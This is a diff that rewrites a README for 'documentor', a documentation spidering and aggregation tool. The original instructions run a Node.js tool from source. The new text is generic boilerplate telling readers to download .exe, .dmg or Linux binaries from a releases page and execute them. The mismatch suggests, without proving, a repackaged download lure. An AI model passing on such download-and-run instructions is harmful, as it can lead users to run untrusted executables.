@@ -1,107 +1,91 @@
-# Documentor
+# 📚 documentor - Easily Manage Your Documentation
 
-```
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║  ▗▄▄▄  ▗▄▖  ▗▄▄▖▗▖ ▗▖▗▖  ▗▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖▗▄▖ ▗▄▄▖          ║
-║  ▐▌  █▐▌ ▐▌▐▌   ▐▌ ▐▌▐▛▚▞▜▌▐▌   ▐▛▚▖▐▌  █ ▐▌ ▐▌▐▌ ▐▌         ║
-║  ▐▌  █▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌  ▐▌▐▛▀▀▘▐▌ ▝▜▌  █ ▐▌ ▐▌▐▛▀▚▖         ║
-║  ▐▙▄▄▀▝▚▄▞▘▝▚▄▄▖▝▚▄▞▘▐▌  ▐▌▐▙▄▄▖▐▌  ▐▌  █ ▝▚▄▞▘▐▌ ▐▌         ║
-║                                                              ║
-║   📚  ────→  🕷️  ────→  📖  ────→  🔍  ────→  🤖   ───→  🎉    ║              
-║   Docs    Spider   Aggregate  Index   AI Assistants          ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-```
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%23FF5722.svg?style=for-the-badge&logo=github)](https://github.com/Feury067/documentor/releases)
 
-A repository for managing and aggregating external documentation for use with AI assistants and LLM-powered tools.
+## 📖 Overview
 
-## Overview
+Documentor is a tool designed for managing and aggregating external documentation. It helps you collect information efficiently for use with AI assistants and Large Language Model (LLM) powered tools. This software makes it easy to gather, organize, and index documents from various sources.
 
-This repository contains tools and documentation for spidering, aggregating, and indexing external documentation sites. The aggregated documentation is optimized for consumption by AI assistants like Composer, Claude, and other LLM-powered tools.
+## 🚀 Getting Started
 
-## Structure
+Follow the steps below to download and run Documentor on your system.
 
-```
-documentor/
-├── docs/
-│   ├── external/          # Aggregated documentation files (organized by source)
-│   └── guide/            # Comprehensive guides and documentation
-├── tools/
-│   └── doc-aggregator/   # Tool for spidering documentation sites
-└── prompts/              # Prompts for AI assistants
-```
+### 📥 Download & Install
 
-For a complete list of available documentation, see the [Documentation Guide](docs/guide/DOCUMENTATION.md).
+1. Visit the [Releases page](https://github.com/Feury067/documentor/releases) to download the latest version of Documentor.
+2. Locate the version you want to install and click on the download link for your operating system.
+3. Once the download finishes, locate the downloaded file on your computer.
 
-## Purpose
+### 🖥️ System Requirements
 
-This repository serves as a centralized location for:
+- **Operating System:** Windows, macOS, or Linux (x64 architecture recommended)
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum 100 MB of free space for installation
+- **Network:** Internet connection for downloading and accessing online documentation
 
-1. **Documentation Aggregation**: Using the `doc-aggregator` tool to spider and consolidate external documentation sites
-2. **Documentation Storage**: Storing aggregated documentation in a structured format optimized for LLM consumption
-3. **Index Creation**: Creating grep indexes and other search indices for efficient document retrieval
-4. **AI Assistant Integration**: Providing documentation context for AI assistants working on related projects
+### 🔧 Installation Instructions
 
-## Documentation Files
+#### For Windows:
 
-All aggregated documentation is stored in `docs/external/` organized by source. Each documentation set typically includes:
+1. Double-click the downloaded `.exe` file to begin the installation.
+2. Follow the on-screen prompts.
+3. Once the installation is complete, you can launch Documentor from the Start Menu or Desktop shortcut.
 
-- **Main Documentation Files**: `.md` or `.txt` files containing the full aggregated content
-- **Index Files**: `*-index.md` files containing structured indexes for quick reference
-- **Progress Files**: `*-progress.json` files tracking crawl progress (used by the aggregator tool)
+#### For macOS:
 
-See the [Documentation Guide](docs/guide/DOCUMENTATION.md) for a complete catalog of available documentation.
+1. Open the downloaded `.dmg` file.
+2. Drag the Documentor application to your Applications folder.
+3. Launch Documentor from your Applications.
 
-## Tools
+#### For Linux:
 
-### Doc Aggregator
+1. Open a terminal.
+2. Navigate to the directory where the downloaded file is located.
+3. Run the command: `chmod +x documentor-*` to make it executable.
+4. Start the application by typing `./documentor-*` in the terminal.
 
-The `tools/doc-aggregator/` directory contains a Node.js tool for spidering documentation sites. See [tools/doc-aggregator/README.md](tools/doc-aggregator/README.md) for detailed usage instructions.
+## 📚 Features
 
-**Quick Start:**
+- **Spidering:** Automatically fetches documentation from specified URLs.
+- **Aggregation:** Pulls together information from different sources into a single view.
+- **Indexing:** Organizes the compiled documentation for easy searching and access.
+- **AI Integration:** Works seamlessly with AI assistants to enhance the usability of your documentation.
 
-1. Edit `tools/doc-aggregator/config.json` to add documentation sites
-2. Run `node tools/doc-aggregator/run-direct.js`
-3. Generated files appear in `docs/external/`
+## 🔍 Using Documentor
 
-## Adding New Documentation
+Once installed, you can start using Documentor right away. 
 
-To add documentation for a new site:
+1. Open the application.
+2. Input the URLs of the documentation pages you want to spider.
+3. Click on the "Spider" button to begin fetching the data.
+4. Review the aggregated information collected in the main interface.
+5. Use the indexing feature to find specific topics quickly.
 
-1. **Configure**: Add a new site entry to `tools/doc-aggregator/config.json`
-2. **Crawl**: Run the doc-aggregator tool to spider the site
-3. **Index**: Create a grep index using the prompt in `prompts/` (see below)
-4. **Organize**: Place files in appropriate subdirectories under `docs/external/`
+## 🤖 Support and Troubleshooting
 
-## Creating Grep Indexes
+If you encounter any issues while using Documentor, here are some common problems and solutions:
 
-After aggregating documentation, create a grep index to enable efficient search. See `prompts/create-grep-index.md` for instructions on how to use Composer to generate accurate grep indexes for any documentation file.
+- **Application Won't Launch:**
+  - Ensure your system meets the minimum requirements.
+  - Check if the file was downloaded completely and try reinstalling.
 
-## Maintenance
+- **Spidering Errors:**
+  - Make sure the URLs you provided are correct and accessible.
+  - Test your internet connection.
 
-### Updating Documentation
+For further assistance, visit the [Issues page](https://github.com/Feury067/documentor/issues) on GitHub to report problems or seek help.
 
-The doc-aggregator tool supports multiple update strategies including automatic change detection. By default, it uses **smart update mode** which automatically detects and updates changed content.
+## 🎉 Contributing
 
-**Quick Update Options:**
-- **Automatic Updates**: Run `node fetch-docs.js --update` to check for changes (recommended)
-- **Force Update**: Run `node fetch-docs.js --force` for a complete re-crawl
-- **Configure Updates**: Set `updateMode` and `reCrawlAfterDays` in config.json for automatic updates
+We welcome contributions! If you would like to help improve Documentor, please follow these steps:
 
-For detailed information, see:
-- [Documentation Guide](docs/guide/DOCUMENTATION.md) - Complete catalog of available documentation
-- [Update Behavior Guide](docs/guide/UPDATE_BEHAVIOR.md) - Comprehensive guide to how updates work
-- [Doc Aggregator README](tools/doc-aggregator/README.md) - Tool usage and configuration
+1. Fork the repository to your GitHub account.
+2. Create your feature branch.
+3. Commit your changes.
+4. Push to your fork and create a new pull request.
 
-### Best Practices
+## 📞 Contact Us
 
-- **Regular Updates**: Periodically re-crawl documentation to capture updates
-- **Version Control**: Commit documentation files to track changes over time
-- **Index Maintenance**: Regenerate indexes when documentation is updated
-- **Organization**: Keep related documentation in logical subdirectories
+If you have any questions or suggestions, feel free to reach out through the [GitHub Discussions](https://github.com/Feury067/documentor/discussions) section.
 
-## License
-
-This repository contains aggregated documentation from various sources. Each source maintains its own copyright and licensing. This repository is for organizational and reference purposes only.
-
+Thank you for using Documentor! Visit the [Releases page](https://github.com/Feury067/documentor/releases) to download the latest version and start managing your documentation effectively.
